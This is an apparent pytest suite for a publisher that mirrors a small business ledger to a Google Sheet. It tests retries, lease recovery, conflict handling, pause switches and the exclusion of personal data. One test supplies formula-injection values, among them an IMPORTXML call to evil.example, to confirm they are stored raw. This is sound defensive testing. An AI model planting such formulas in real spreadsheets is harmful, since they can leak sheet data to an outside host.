"""V2-29 mirror publisher gates (§14, §20), on fakes only: no network, no database, no secret."""

from __future__ import annotations

import copy
import logging
from dataclasses import replace
from datetime import timedelta
from types import SimpleNamespace
from typing import Any

import pytest
from app.core.config import Settings
from app.services.os_ledger import api
from app.services.os_ledger import guard as ledger_guard
from app.services.os_ledger import mirror_projection as mp
from app.services.os_ledger.outbox import LEASE_TTL, MirrorState, destination_binding
from app.workers import os_mirror

from tests.workers.mirror_fakes import (
    Clock,
    FakeOutbox,
    FakeReader,
    FakeSheets,
    TxCounter,
    outbox_body,
)

SHEET_ID = "mirror-sheet-1"
MARK = "PERSONAL-MARKER-7731"

LEAD = {
    "lead_id": "LEA_one", "person_id": "PER_lead", "name": "Noa", "phone": "", "email": "",
    "path": "לימוד", "status": "חדש", "source_note": "",
}
CLIENT = {
    "person_id": "PER_alpha", "name": "Dana", "phone": "0521234567", "email": "d@example.com",
    "status": "פעיל", "notes": "",
}
WORK = {
    "work_id": "WOR_one", "person_id": "PER_alpha", "title": "Site", "path": "אוטומציה",
    "start_date": "2026-09-01", "status": "פעילה", "agreed_amount_ils": 500000, "currency": "ILS",
}
PAYMENT = {
    "payment_id": "PAY_one", "person_id": "PER_alpha", "work_id": "WOR_one", "path": "אוטומציה",
    "date": "2026-10-01", "actual_amount_ils": 150050, "currency": "ILS", "kind": "התקבל",
    "original_payment_id": None, "notes": None,
}
TIME = {
    "time_id": "TIM_one", "person_id": "PER_alpha", "work_id": "WOR_one", "path": "אוטומציה",
    "date": "2026-10-02", "minutes": 90, "description": "build", "status": "פעיל",
}
EXPENSE = {
    "expense_id": "EXP_one", "date": "2026-10-03", "category": "hosting", "platform": "OpenAI",
    "path": "אוטומציה", "vendor": "Cloud", "amount_ils": 2000, "currency": "ILS",
    "payment_status": "שולם", "source_type": "תשלום בפועל", "source_key": "", "notes": "",
}
TASK = {
    "task_id": "TAS_one", "title": "Call Dana", "person_id": "PER_alpha", "work_id": None,
    "path": "אוטומציה", "status": "לביצוע", "due_date": "2026-10-20", "notes": "",
}
MONTHLY = {
    "month": "2026-10", "currency": "ILS", "paid_income_ils": 150050,
    "paid_expenses_ils": 2000, "net_cash_ils": 148050, "recorded_minutes": 90,
    "effective_hourly_ils": 100033, "coverage": "complete", "reason_codes": [],
}


def mirror_settings(**overrides: Any) -> Settings:
    values: dict[str, Any] = {
        "assaf_os_mirror_enabled": True,
        "os_mirror_spreadsheet_id": SHEET_ID,
    }
    values.update(overrides)
    return Settings(_env_file=None, **values)


class World:
    def __init__(self) -> None:
        self.counter = TxCounter()
        self.clock = Clock()
        self.reader = FakeReader(self.counter)
        self.outbox = FakeOutbox(self.counter, self.clock)
        self.sheets = FakeSheets(mp.MIRROR_TABS, guard=self.no_open_transaction)
        self.guard_checks = 0
        self.deps = os_mirror.MirrorDeps(
            reader=self.reader,
            context=lambda: object(),
            outbox=self.outbox,
            transport=self.sheets,
            destination_binding=destination_binding(SHEET_ID),
        )
        self.settings = mirror_settings()

    def no_open_transaction(self) -> None:
        self.guard_checks += 1
        assert self.counter.open == 0, "a transaction is open during a transport call"

    def commit(self, entity: str, record: dict[str, Any]) -> str:
        version = self.reader.commit(entity, record)
        key = api.ID_KEYS[entity]
        stored = self.reader.records[entity][record[key]]
        body = outbox_body(self.reader.epoch, [(entity, stored[key], stored["revision"])])
        return self.outbox.add(version, body, at=self.clock())

    def seed(self) -> list[str]:
        self.reader.monthly = [dict(MONTHLY)]
        return [
            self.commit(entity, record)
            for entity, record in (
                ("leads", LEAD), ("clients", CLIENT), ("works", WORK), ("payments", PAYMENT),
                ("time", TIME), ("expenses", EXPENSE), ("tasks", TASK),
            )
        ]

    def tick(
        self, *, anti_entropy: bool = False, owner: str = "w1", settings: Settings | None = None
    ) -> os_mirror.TickResult:
        return os_mirror.run_once(
            self.deps,
            settings or self.settings,
            now=self.clock(),
            lease_owner=owner,
            anti_entropy=anti_entropy,
        )

    def state(self) -> MirrorState:
        return self.outbox.snapshot()

    def statuses(self, ids: list[str]) -> list[str]:
        return [self.outbox.row(event_id)["status"] for event_id in ids]


@pytest.fixture
def world() -> World:
    return World()


def test_first_delivery_writes_the_full_projection_and_verifies(world: World) -> None:
    ids = world.seed()
    result = world.tick()
    assert (result.outcome, result.reason) == ("verified", "readback_equal")
    state = world.state()
    assert state.status == "synced"
    assert state.verified_version == world.reader.version == state.projected_version
    assert world.statuses(ids) == ["sent"] * len(ids)
    assert len(world.sheets.writes) == 1
    written = {mp.tab_of(a1) for a1, _ in world.sheets.writes[0]}
    assert written == set(mp.MIRROR_TABS)
    # Headers are the schema labels.
    assert world.sheets.values(mp.ENTITY_TABS["clients"])[0] == list(mp.headers("clients"))


@pytest.mark.parametrize("equal", [True, False])
def test_empty_progress_rewrites_retried_events_and_clears_old_extents(world: World, equal):
    ids = world.seed()
    assert world.tick().outcome == "verified"
    writes, reads = len(world.sheets.writes), world.sheets.reads
    world.outbox.state.update(
        status="pending", projected_version=0, verified_version=0,
        last_attempt_at=None, last_verified_at=None, last_error_code=None, scan_coverage={},
    )
    for event_id in ids:
        world.outbox.row(event_id).update(status="unknown", next_attempt_at=world.clock())
    if not equal:
        world.sheets.grid[mp.ENTITY_TABS["tasks"]][(50, 30)] = "stale-tail"
    assert world.tick().outcome == "verified"
    assert len(world.sheets.writes) == writes + 1, "empty progress must be re-proven by a write"
    assert world.sheets.reads == reads + 2, "extent scan, then readback after the full rewrite"
    assert "stale-tail" not in world.sheets.all_cells()
    assert world.state().verified_version == world.reader.version


@pytest.mark.parametrize("failure", ["extent_scan", "write_not_sent"])
def test_empty_progress_still_requires_a_rewrite_after_a_prewrite_failure(world: World, failure):
    ids = world.seed()
    assert world.tick().outcome == "verified"
    writes = len(world.sheets.writes)
    world.outbox.state.update(
        status="pending", projected_version=0, verified_version=0,
        last_attempt_at=None, last_verified_at=None, last_error_code=None, scan_coverage={},
    )
    for event_id in ids:
        world.outbox.row(event_id).update(status="unknown", next_attempt_at=world.clock())
    if failure == "extent_scan":
        world.sheets.fail_next_read = True
    else:
        world.sheets.fail_next_write = "not_sent"
    assert world.tick().outcome == "delayed"
    assert world.state().verified_version == 0
    attempted_writes = len(world.sheets.writes)
    assert attempted_writes == writes + (failure == "write_not_sent")
    world.clock.advance(60)
    assert world.tick().outcome == "verified"
    assert len(world.sheets.writes) == attempted_writes + 1
    assert world.state().last_verified_at == world.clock()


# ---------------------------------------------------------------------------------------------
# §20 gate: a lost ack converges on readback.


def test_lost_ack_becomes_unknown_then_converges_on_readback_without_a_rewrite(world: World):
    ids = world.seed()
    world.sheets.fail_next_write = "lost_ack"
    first = world.tick()
    assert (first.outcome, first.reason) == ("unknown", "mirror_timeout")
    assert world.statuses(ids) == ["unknown"] * len(ids)
    assert world.state().status == "unknown"
    assert world.state().verified_version == 0
    assert len(world.sheets.writes) == 1

    world.clock.advance(60)
    second = world.tick()
    assert (second.outcome, second.reason) == ("verified", "readback_equal")
    assert len(world.sheets.writes) == 1, "an unknown write is read back before any rewrite"
    assert world.statuses(ids) == ["sent"] * len(ids)
    assert world.state().status == "synced"
    assert world.state().verified_version == world.reader.version


def test_unknown_that_did_not_land_is_rewritten_after_the_readback(world: World) -> None:
    ids = world.seed()
    world.sheets.fail_next_write = "lost_ack"
    world.tick()
    world.sheets.grid = {tab: {} for tab in mp.MIRROR_TABS}  # the write never landed after all
    world.clock.advance(60)
    result = world.tick()
    assert result.outcome == "verified"
    assert len(world.sheets.writes) == 2
    assert world.statuses(ids) == ["sent"] * len(ids)


# ---------------------------------------------------------------------------------------------
# §20 gate: a crash between claim and finish is reclaimed after lease_ttl and delivered once.


def test_crash_between_claim_and_finish_is_reclaimed_after_lease_ttl_and_delivered_once(
    world: World,
) -> None:
    ids = world.seed()
    dead = world.outbox.claim(100, "crashed-worker", world.clock())
    assert len(dead) == len(ids)

    world.clock.advance(LEASE_TTL.total_seconds() - 1)
    assert world.tick(owner="w2").outcome == "idle"
    assert world.sheets.writes == []

    world.clock.advance(2)
    result = world.tick(owner="w2")
    assert result.outcome == "verified"
    assert len(world.sheets.writes) == 1
    assert world.statuses(ids) == ["sent"] * len(ids)
    assert {world.outbox.row(i)["lease_generation"] for i in ids} == {2}

    # The crashed worker's late finish loses the compare-and-set and changes nothing.
    late = world.outbox.finish(dead[0], dead[0].lease_generation, "conflict", "late", world.clock())
    assert late is False
    assert world.outbox.row(dead[0].event_id)["status"] == "sent"
    world.clock.advance(LEASE_TTL.total_seconds() * 2)
    assert world.tick(owner="w2").outcome == "idle"
    assert len(world.sheets.writes) == 1, "delivered exactly once"


# ---------------------------------------------------------------------------------------------
# §20 gates: verified_version never moves backwards under out-of-order finishes; a stale write
# landing after a newer readback is caught by anti-entropy with an empty queue; and conflict
# clears only through a full rewrite and an equal readback.


def _stale_writer_scenario(world: World) -> tuple[int, dict[str, Any]]:
    world.seed()
    assert world.tick().outcome == "verified"
    world.clock.advance(10)
    world.commit("tasks", {**TASK, "status": "בתהליך"})
    stale_version = world.reader.version
    newer_grid: dict[str, Any] = {}

    def newer_worker_runs_first() -> None:
        world.clock.advance(1)
        world.commit("tasks", {**TASK, "status": "בוצע"})
        newer = world.tick(owner="B")
        assert newer.outcome == "verified"
        newer_grid.update(copy.deepcopy(world.sheets.grid))

    world.sheets.before_apply = newer_worker_runs_first
    stale = world.tick(owner="A")  # loads V(stale) and its write lands after B's verification
    assert stale.outcome == "verified"
    assert world.reader.version == stale_version + 1
    return stale_version, newer_grid


def test_verified_version_never_moves_backwards_under_out_of_order_finishes(world: World):
    stale_version, _ = _stale_writer_scenario(world)
    state = world.state()
    assert state.verified_version == world.reader.version == stale_version + 1
    assert state.status == "synced"


def test_stale_write_after_a_newer_readback_is_caught_by_anti_entropy_with_an_empty_queue(
    world: World,
) -> None:
    _stale_writer_scenario(world)
    writes = len(world.sheets.writes)
    world.clock.advance(5)
    assert world.outbox.claim(100, "probe", world.clock()) == []  # the queue is empty
    result = world.tick(anti_entropy=True)
    assert (result.outcome, result.reason) == ("conflict", "drift")
    state = world.state()
    assert (state.status, state.last_error_code) == ("conflict", "drift")
    assert state.verified_version == world.reader.version
    assert len(world.sheets.writes) == writes, "drift is flagged, never silently imported"


def test_conflict_clears_only_through_a_full_rewrite_and_an_equal_readback(world: World):
    _, newer_grid = _stale_writer_scenario(world)
    world.clock.advance(5)
    assert world.tick(anti_entropy=True).outcome == "conflict"
    verified_at = world.state().last_verified_at

    # Even if the sheet happens to read back equal again, nothing clears conflict without a
    # full rewrite: an idle tick changes nothing.
    world.sheets.grid = copy.deepcopy(newer_grid)
    world.clock.advance(5)
    assert world.tick().outcome == "idle"
    assert world.state().status == "conflict"

    # A rewrite that reads back unequal keeps conflict.
    world.sheets.mangle = lambda v: f"{v}*" if v == "Dana" else v
    writes = len(world.sheets.writes)
    mismatch = world.tick(anti_entropy=True)
    assert (mismatch.outcome, mismatch.reason) == ("conflict", "readback_mismatch")
    assert len(world.sheets.writes) == writes + 1
    assert world.state().status == "conflict"
    assert world.state().last_verified_at == verified_at

    # The next full rewrite with an equal readback clears it.
    world.sheets.mangle = None
    world.clock.advance(5)
    cleared = world.tick(anti_entropy=True)
    assert (cleared.outcome, cleared.reason) == ("verified", "readback_equal")
    assert len(world.sheets.writes) == writes + 2
    written = {mp.tab_of(a1) for a1, _ in world.sheets.writes[-1]}
    assert written == set(mp.MIRROR_TABS), "the recovery is a full rewrite"
    state = world.state()
    assert state.status == "synced"
    assert state.verified_version == world.reader.version
    assert state.last_verified_at == world.clock()


def test_a_transport_error_during_conflict_keeps_conflict_until_a_verified_rewrite(
    world: World,
) -> None:
    world.seed()
    world.tick()
    world.sheets.edit(mp.ENTITY_TABS["clients"], 1, 1, "Edited by hand")
    world.clock.advance(5)
    assert world.tick(anti_entropy=True).reason == "drift"
    task_row = world.commit("tasks", {**TASK, "title": "Call Dana again"})
    world.sheets.fail_next_write = "lost_ack"
    world.clock.advance(5)
    assert world.tick().outcome == "unknown"
    assert world.state().status == "conflict", "an unknown ack never erases a conflict"
    assert world.outbox.row(task_row)["status"] == "unknown"
    writes = len(world.sheets.writes)
    world.clock.advance(60)
    result = world.tick()
    assert result.outcome == "verified"
    assert len(world.sheets.writes) == writes + 1, "conflict is never cleared by a readback alone"
    assert world.state().status == "synced"


# ---------------------------------------------------------------------------------------------
# §20 gate: RAW formulas.


def test_formula_like_text_is_written_raw_and_read_back_verbatim(world: World) -> None:
    hostile = {
        "name": '=IMPORTXML("https://evil.example/x","//a")',
        "notes": "+SUM(A1:A9)",
        "email": "@cmd",
        "phone": "-1+1",
    }
    world.commit("clients", {**CLIENT, **hostile})
    result = world.tick()
    assert result.outcome == "verified"
    rows = world.sheets.values(mp.ENTITY_TABS["clients"])
    labels = list(mp.headers("clients"))
    record = dict(zip(labels, rows[1], strict=False))
    for key, value in hostile.items():
        assert record[mp.label("clients", key)] == value
    sent = [cell for _, rows in world.sheets.writes[0] for row in rows for cell in row]
    assert all(value in sent for value in hostile.values())
    assert not any(isinstance(c, str) and c.startswith("'=") for c in sent)


# ---------------------------------------------------------------------------------------------
# §20 gate: no transaction is open during a transport call (instrumented).


def test_no_transaction_is_open_during_any_transport_call(world: World) -> None:
    world.seed()
    world.sheets.fail_next_write = "lost_ack"
    world.tick()
    world.clock.advance(60)
    world.tick()
    world.sheets.edit(mp.ENTITY_TABS["tasks"], 1, 2, "x")
    world.clock.advance(5)
    world.tick(anti_entropy=True)
    world.clock.advance(5)
    world.tick(anti_entropy=True)
    assert world.counter.max_seen >= 1, "the fakes did open transactions"
    assert world.guard_checks >= 5  # write, read, drift read, rewrite, read
    assert world.counter.open == 0


# ---------------------------------------------------------------------------------------------
# §20 gate: kill-switch pause (and the freeze, and default-off).


@pytest.mark.parametrize(
    ("overrides", "reason"),
    [
        ({"kill_switch": True}, "kill_switch"),
        ({"assaf_os_freeze": True}, "os_frozen"),
        ({"assaf_os_mirror_enabled": False}, "disabled"),
        ({"os_mirror_spreadsheet_id": "another-sheet"}, "mirror_target_changed"),
    ],
)
def test_kill_switch_freeze_and_default_off_pause_the_worker(
    world: World, overrides, reason, monkeypatch
):
    monkeypatch.setattr(api, "core_authority_state", lambda _settings: "shadow")
    ids = world.seed()
    paused = world.tick(settings=mirror_settings(**overrides), anti_entropy=True)
    assert (paused.outcome, paused.reason) == ("paused", reason)
    assert world.outbox.calls == [] and world.reader.calls == []
    assert world.sheets.writes == [] and world.sheets.reads == 0
    assert world.statuses(ids) == ["pending"] * len(ids)
    assert {world.outbox.row(i)["attempts"] for i in ids} == {0}
    assert world.tick().outcome == "verified"


def test_freeze_with_active_authority_publishes_and_verifies(world: World, monkeypatch) -> None:
    ids = world.seed()
    settings = mirror_settings(assaf_os_freeze=True)
    calls = []

    def authority_reader(loaded):
        assert loaded is settings
        assert world.outbox.calls == [] and world.reader.calls == []
        assert world.sheets.writes == [] and world.sheets.reads == 0
        with world.counter.tx():
            calls.append(1)
            return "active"

    monkeypatch.setattr(api, "core_authority_state", authority_reader)
    result = world.tick(settings=settings)
    assert result == os_mirror.TickResult("verified", "readback_equal", len(ids))
    assert calls == [1]
    assert world.statuses(ids) == ["sent"] * len(ids)
    assert len(world.sheets.writes) == 1 and world.sheets.reads == 2
    state = world.state()
    assert state.status == "synced"
    assert state.verified_version == world.reader.version == state.projected_version
    assert world.counter.open == 0


@pytest.mark.parametrize("freeze", [False, True])
@pytest.mark.parametrize("publisher_path", [False, True])
def test_active_precheck_with_shadow_snapshot_requires_active_under_freeze(
    world: World, freeze, publisher_path,
) -> None:
    ids = world.seed()
    world.reader.states["core"] = "shadow"
    settings = mirror_settings(assaf_os_freeze=freeze)
    calls = []

    def authority_reader(_settings):
        calls.append(1)
        return "active"

    publisher = os_mirror.MirrorPublisher(
        settings_provider=lambda: settings, deps_factory=lambda _: world.deps,
        clock=world.clock, authority_reader=authority_reader,
    )
    result = publisher.tick() if publisher_path else os_mirror.run_once(
        world.deps, settings, now=world.clock(), lease_owner="w1", anti_entropy=True,
        authority_reader=authority_reader,
    )
    assert calls == ([1] if freeze else [])
    if freeze:
        assert result == os_mirror.TickResult("paused", "authority_not_publishing", len(ids))
        assert world.statuses(ids) == ["pending"] * len(ids)
        assert world.sheets.writes == [] and world.sheets.reads == 0
    else:
        assert result == os_mirror.TickResult("verified", "readback_equal", len(ids))
        assert world.statuses(ids) == ["sent"] * len(ids)
        assert len(world.sheets.writes) == 1 and world.sheets.reads == 2


@pytest.mark.parametrize("authority", ["shadow", "fenced", "restoring", None, "missing",
                                        "ledger_error", "unexpected_error"])
@pytest.mark.parametrize("publisher_path", [False, True])
def test_freeze_without_active_authority_pauses_without_calls(
    world: World, authority, caplog, publisher_path
) -> None:
    ids = world.seed()
    rows = copy.deepcopy(world.outbox.rows)
    calls = []

    def authority_reader(_settings):
        calls.append(1)
        if authority == "ledger_error":
            raise api.LedgerError("ledger_unavailable", reason="read_failed")
        if authority == "unexpected_error":
            raise RuntimeError(MARK)
        return authority

    built = []

    def deps_factory(_settings):
        built.append(1)
        return world.deps

    publisher = os_mirror.MirrorPublisher(
        settings_provider=lambda: mirror_settings(assaf_os_freeze=True),
        deps_factory=deps_factory, clock=world.clock, authority_reader=authority_reader,
    )
    with caplog.at_level(logging.INFO):
        result = publisher.tick() if publisher_path else os_mirror.run_once(
            world.deps, mirror_settings(assaf_os_freeze=True), now=world.clock(),
            lease_owner="w1", anti_entropy=True, authority_reader=authority_reader,
        )
    assert result == os_mirror.TickResult("paused", "os_frozen")
    assert calls == [1]
    assert built == []
    assert world.outbox.calls == [] and world.reader.calls == []
    assert world.sheets.writes == [] and world.sheets.reads == 0
    assert world.outbox.rows == rows and world.outbox.state is None
    assert world.statuses(ids) == ["pending"] * len(ids)
    assert {world.outbox.row(i)["attempts"] for i in ids} == {0}
    assert MARK not in caplog.text


@pytest.mark.parametrize(
    ("overrides", "reason"),
    [
        ({"kill_switch": True}, "kill_switch"),
        ({"kill_switch": True, "assaf_os_mirror_enabled": False}, "kill_switch"),
        ({"assaf_os_mirror_enabled": False}, "disabled"),
        ({"os_mirror_spreadsheet_id": "another-sheet"}, "mirror_target_changed"),
    ],
)
@pytest.mark.parametrize("publisher_path", [False, True])
def test_static_pauses_skip_the_authority_read_under_freeze(
    world: World, overrides, reason, publisher_path
):
    ids = world.seed()
    calls = []

    def authority_reader(_settings):
        calls.append(1)
        return "active"

    settings = mirror_settings(assaf_os_freeze=True, **overrides)
    built = []

    def deps_factory(loaded):
        built.append(1)
        return replace(world.deps, destination_binding=destination_binding(
            loaded.os_mirror_spreadsheet_id,
        ))

    publisher = os_mirror.MirrorPublisher(
        settings_provider=lambda: settings, deps_factory=deps_factory,
        clock=world.clock, authority_reader=authority_reader,
    )
    publisher._deps = world.deps  # also exercise a target change on an existing publisher
    if publisher_path and reason == "mirror_target_changed":
        world.outbox.load_state(world.deps.destination_binding, world.clock())
        world.outbox.calls.clear()
    result = publisher.tick() if publisher_path else os_mirror.run_once(
        world.deps, settings, now=world.clock(),
        lease_owner="w1", anti_entropy=True, authority_reader=authority_reader,
    )
    assert result == os_mirror.TickResult("paused", reason)
    assert calls == []
    assert world.outbox.calls == [] and world.reader.calls == []
    assert world.sheets.writes == [] and world.sheets.reads == 0
    assert world.statuses(ids) == ["pending"] * len(ids)
    assert {world.outbox.row(i)["attempts"] for i in ids} == {0}
    if publisher_path and reason == "mirror_target_changed":
        assert publisher._deps is None
        assert built == []
        assert publisher.tick() == os_mirror.TickResult("refused", "mirror_destination_changed")
        assert built == [1] and calls == [1]
        assert world.outbox.calls == ["load_state"]
        assert world.reader.calls == []
        assert world.sheets.writes == [] and world.sheets.reads == 0
        assert world.statuses(ids) == ["pending"] * len(ids)


@pytest.mark.parametrize("publisher_path", [False, True])
def test_freeze_off_never_reads_authority(world: World, monkeypatch, publisher_path) -> None:
    calls = []

    def authority_reader(_settings):
        calls.append(1)
        raise AssertionError("freeze-off authority read")

    monkeypatch.setattr(api, "core_authority_state", authority_reader)
    ids = world.seed()
    publisher = os_mirror.MirrorPublisher(
        settings_provider=lambda: mirror_settings(assaf_os_freeze=False),
        deps_factory=lambda _settings: world.deps, clock=world.clock,
    )
    result = publisher.tick() if publisher_path else world.tick()
    assert result == os_mirror.TickResult("verified", "readback_equal", len(ids))
    assert calls == []


def test_publisher_freeze_reads_authority_once_and_logs_each_pause_transition(
    world: World, caplog
) -> None:
    caplog.set_level(logging.INFO, logger="mia.os_mirror")
    authority = "active"
    calls = []
    built = []

    def authority_reader(_settings):
        assert world.counter.open == 0
        with world.counter.tx():
            calls.append(authority)
            return authority

    def deps_factory(_settings):
        assert calls == ["active"]
        built.append(1)
        return world.deps

    publisher = os_mirror.MirrorPublisher(
        settings_provider=lambda: mirror_settings(assaf_os_freeze=True),
        deps_factory=deps_factory, clock=world.clock, authority_reader=authority_reader,
    )
    ids = world.seed()
    assert publisher.tick() == os_mirror.TickResult("verified", "readback_equal", len(ids))
    assert calls == ["active"] and built == [1]
    authority = "restoring"
    rows = copy.deepcopy(world.outbox.rows)
    state = copy.deepcopy(world.outbox.state)
    counts = (len(world.outbox.calls), len(world.reader.calls), len(world.sheets.writes),
              world.sheets.reads)
    for _ in range(3):
        assert publisher.tick() == os_mirror.TickResult("paused", "os_frozen")
    assert calls == ["active", "restoring", "restoring", "restoring"]
    assert counts == (len(world.outbox.calls), len(world.reader.calls), len(world.sheets.writes),
                      world.sheets.reads)
    assert world.outbox.rows == rows and world.outbox.state == state
    paused = [r.getMessage() for r in caplog.records if "outcome=paused" in r.getMessage()]
    assert paused == ["os_mirror op=tick outcome=paused reason=os_frozen"]
    authority = "active"
    assert publisher.tick().outcome == "idle"
    authority = "restoring"
    assert publisher.tick() == os_mirror.TickResult("paused", "os_frozen")
    paused = [r.getMessage() for r in caplog.records if "outcome=paused" in r.getMessage()]
    assert paused == ["os_mirror op=tick outcome=paused reason=os_frozen"] * 2


def test_freeze_active_precheck_keeps_the_snapshot_authority_gate(world: World, monkeypatch):
    ids = world.seed()
    monkeypatch.setattr(api, "core_authority_state", lambda _settings: "active")
    world.reader.states["core"] = "fenced"
    result = world.tick(settings=mirror_settings(assaf_os_freeze=True))
    assert result == os_mirror.TickResult("paused", "authority_fenced", len(ids))
    assert world.sheets.writes == [] and world.sheets.reads == 0
    assert world.statuses(ids) == ["pending"] * len(ids)
    assert world.state().status == "fenced"


def test_publisher_logs_a_pause_once_and_never_calls_out(world: World, caplog) -> None:
    caplog.set_level(logging.INFO, logger="mia.os_mirror")
    built: list[int] = []

    def deps_factory(_settings: Settings) -> os_mirror.MirrorDeps:
        built.append(1)
        return world.deps

    publisher = os_mirror.MirrorPublisher(
        settings_provider=lambda: mirror_settings(kill_switch=True),
        deps_factory=deps_factory,
        clock=world.clock,
    )
    world.seed()
    for _ in range(3):
        assert publisher.tick().outcome == "paused"
    assert built == []
    paused = [r.getMessage() for r in caplog.records if "outcome=paused" in r.getMessage()]
    assert paused == ["os_mirror op=tick outcome=paused reason=kill_switch"]


@pytest.mark.parametrize(("fail", "stuck"), [("read", "unknown"), ("write", "delayed")])
def test_publisher_recovers_an_unknown_or_delayed_mirror_before_the_next_anti_entropy(
    world: World, fail: str, stuck: str
) -> None:
    publisher = os_mirror.MirrorPublisher(
        settings_provider=lambda: world.settings,
        deps_factory=lambda _settings: world.deps,
        clock=world.clock,
    )
    world.seed()
    assert publisher.tick().outcome == "verified"
    world.reader.commit("tasks", {**TASK, "title": "moved"})  # no outbox row: only a full pass
    world.clock.advance(900)
    if fail == "read":
        world.sheets.fail_next_read = True
    else:
        world.sheets.fail_next_write = "not_sent"
    assert publisher.tick().outcome == stuck
    assert world.state().status == stuck
    world.clock.advance(5)
    assert publisher.tick().outcome == "idle"  # a floor, so a 429 never becomes a write loop
    world.clock.advance(os_mirror.RECOVERY_RETRY.total_seconds())
    recovered = publisher.tick()
    assert recovered.outcome == "verified"
    assert world.state().status == "synced"
    assert world.state().verified_version == world.reader.version
    # The unknown write had landed: it is read back, never rewritten.
    assert len(world.sheets.writes) == (2 if fail == "read" else 3)


# ---------------------------------------------------------------------------------------------
# Production wiring (review r1 F1)

FAKE_ACCOUNT = (
    '{"type":"service_account","client_email":"m@example.com","private_key":"-----BEGIN KEY"}'
)


def test_build_deps_accepts_the_bare_postgresql_dsn_that_provisioning_writes(monkeypatch):
    # provision_ledger.py writes runtime.env with a bare postgresql:// DSN. Engines are lazy.
    monkeypatch.setattr(ledger_guard, "_ENGINES", {})
    monkeypatch.setattr(ledger_guard, "_GUARDS", {})
    dsn = "postgresql://ledger:x@127.0.0.1:1/mia"
    settings = mirror_settings(
        os_mirror_service_account_json=FAKE_ACCOUNT,
        assaf_os_workspace_id="ws-1",
        owner_os_ledger_database_url=dsn,
        database_url="postgresql://mia:x@127.0.0.1:1/mia",
    )
    deps = os_mirror.build_deps(settings)
    engine = deps.outbox._engine
    assert engine.dialect.driver == "psycopg"
    assert engine is ledger_guard.engine_for(dsn)


def test_an_unexpected_deps_failure_is_a_coded_deferral_with_a_retry(world: World, caplog):
    caplog.set_level(logging.INFO, logger="mia.os_mirror")
    built: list[int] = []

    def deps_factory(_settings: Settings) -> os_mirror.MirrorDeps:
        built.append(1)
        if len(built) == 1:
            raise ModuleNotFoundError("No module named 'psycopg2'")
        return world.deps

    publisher = os_mirror.MirrorPublisher(
        settings_provider=lambda: world.settings, deps_factory=deps_factory, clock=world.clock
    )
    world.seed()
    assert publisher.tick() == os_mirror.TickResult("deferred", "deps_failed")
    assert publisher.tick() == os_mirror.TickResult("deferred", "deps_backoff")
    world.clock.advance(os_mirror.DEPS_RETRY.total_seconds())
    assert publisher.tick().outcome == "verified"
    assert built == [1, 1]
    messages = [r.getMessage() for r in caplog.records]
    assert "os_mirror op=start outcome=deferred reason=deps_failed" in messages
    assert not any("psycopg2" in m for m in messages)


# ---------------------------------------------------------------------------------------------
# §20 gate: no personal lines.


def test_personal_lines_are_never_projected(world: World) -> None:
    world.reader.personal_lines = [{"line_key": "k1", "merchant": MARK, "detail": MARK}]
    world.seed()
    world.commit("expenses", {**EXPENSE, "detail": MARK, "merchant_text": MARK})
    bad = world.outbox.add(
        world.reader.version + 1,
        {"authority_epoch": 1, "refs": [{"entity": "statements", "record_id": "s1",
                                          "revision": 1}]},
        at=world.clock(),
    )
    result = world.tick()
    assert result.outcome == "verified"
    assert world.outbox.row(bad)["status"] == "conflict"
    assert world.outbox.row(bad)["last_error_code"] == "outbox_body_invalid"
    cells = [c for _, rows in world.sheets.writes[0] for row in rows for c in row]
    assert not any(MARK in str(c) for c in cells)
    assert not any(MARK in str(c) for c in world.sheets.all_cells())
    assert {mp.tab_of(a1) for a1, _ in world.sheets.writes[0]} == set(mp.MIRROR_TABS)


# ---------------------------------------------------------------------------------------------
# More of §14


def test_rows_from_another_epoch_are_refused_and_never_delivered(world: World) -> None:
    world.seed()
    old = world.outbox.add(world.reader.version + 1, outbox_body(epoch=0), at=world.clock())
    result = world.tick()
    assert result.outcome == "verified"
    assert world.outbox.row(old)["status"] == "conflict"
    assert world.outbox.row(old)["last_error_code"] == "authority_changed"


def test_fenced_authority_pauses_and_reports_fenced(world: World) -> None:
    ids = world.seed()
    world.reader.states["core"] = "fenced"
    result = world.tick()
    assert (result.outcome, result.reason) == ("paused", "authority_fenced")
    assert world.sheets.writes == []
    assert world.statuses(ids) == ["pending"] * len(ids)
    assert world.state().status == "fenced"
    world.reader.states["core"] = "active"
    world.clock.advance(60)
    assert world.tick().outcome == "verified"


@pytest.mark.parametrize("status,projected,verified,error,attempted,expected", [
    ("synced", 3, 3, None, True, "authority_fenced"),
    ("fenced", 3, 3, "authority_fenced", True, "authority_fenced"),
    ("pending", 0, 0, None, False, "authority_fenced"),
    ("synced", 3, 2, None, True, "authority_fenced_unclean"),
    ("synced", 3, 3, "readback_failed", True, "authority_fenced_unclean"),
    ("conflict", 3, 3, "drift", True, "authority_fenced_unclean"),
    ("conflict", 3, 3, "readback_mismatch", True, "authority_fenced_unclean"),
    ("unknown", 3, 3, "mirror_timeout", True, "authority_fenced_unclean"),
    ("pending", 3, 3, None, True, "authority_fenced_unclean"),
    ("delayed", 3, 3, None, True, "authority_fenced_unclean"),
    ("pending", 0, 0, None, True, "authority_fenced_unclean"),
    ("pending", 0, 0, "mirror_timeout", False, "authority_fenced_unclean"),
    ("fenced", 3, 2, "authority_fenced", True, "authority_fenced_unclean"),
    ("fenced", 3, 3, None, True, "authority_fenced_unclean"),
    ("fenced", 3, 3, "authority_fenced_unclean", True, "authority_fenced_unclean"),
])
def test_fence_preserves_previous_cleanliness(
    world: World, status, projected, verified, error, attempted, expected,
):
    world.outbox.load_state(world.deps.destination_binding, world.clock())
    world.outbox.state.update(
        status=status, projected_version=projected, verified_version=verified,
        last_error_code=error, last_attempt_at=world.clock() if attempted else None,
        last_verified_at=world.clock() if verified else None,
    )
    world.reader.version = max(projected, verified, world.reader.version)
    world.reader.states["core"] = "fenced"
    for _ in range(2):
        result = world.tick(anti_entropy=True)
        assert result == os_mirror.TickResult("paused", expected, 0)
        state = world.state()
        assert state.status == "fenced" and state.last_error_code == expected
        assert (state.projected_version, state.verified_version) == (projected, verified)
    assert world.sheets.writes == [] and world.sheets.reads == 0


def test_not_sent_error_defers_with_backoff_and_reports_delayed(world: World) -> None:
    ids = world.seed()
    world.sheets.fail_next_write = "not_sent"
    result = world.tick()
    assert (result.outcome, result.reason) == ("delayed", "mirror_http_429")
    assert world.statuses(ids) == ["pending"] * len(ids)
    assert world.state().status == "delayed"
    assert world.tick().outcome == "idle"  # backoff: not due yet
    world.clock.advance(60)
    assert world.tick().outcome == "verified"


def test_readback_failure_after_a_write_is_unknown(world: World) -> None:
    ids = world.seed()
